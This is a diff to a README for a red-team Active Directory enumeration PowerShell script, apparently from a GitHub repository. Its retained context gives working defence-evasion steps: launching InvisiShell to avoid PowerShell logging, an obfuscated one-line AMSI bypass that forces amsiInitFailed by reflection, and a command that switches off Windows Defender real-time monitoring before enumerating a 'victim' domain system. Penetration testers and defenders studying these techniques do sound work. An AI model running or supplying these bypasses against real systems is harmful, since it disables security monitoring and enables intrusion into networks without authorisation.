@@ -20,12 +20,15 @@ Not necessary to be an admin to run the script, but of course easier to get arou
 ### Bypassing PowerShell Security
 
 **To avoid verbose PowerShell logging - use [invishell](https://github.com/OmerYa/InvisiShell) (RunWithRegistryNonAdmin)**
-        ```C:\PATH\TO\SCRIPTS\InviShell\RunWithRegistryNonAdmin.bat```
+
+```C:\PATH\TO\SCRIPTS\InviShell\RunWithRegistryNonAdmin.bat```
 
 **AntiMalware Scan Interface (AMSI) may detect some tools when you load them. Uses the following AMSI bypass:**
+
 ```sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )```
 
 **Stop Windows Defender (need to be admin)**
+
 ```Set-MpPreference -DisableRealTimeMonitoring $true```
                              
 After which you can run the script to enumerate your target. Now we can run the script on the vitim system that in joined to your target AD domain.
@@ -42,7 +45,7 @@ Want to do it manually:
 
 ![ADredTeamEnumScript2](https://user-images.githubusercontent.com/20993128/129828201-8302ade2-9926-4c7b-ab9f-6433b997bd09.png)
 
-4. Run the first full script:
+4. Now run the main script:
 
 ```.\ADRedTeamEnumScripts.ps1```
 
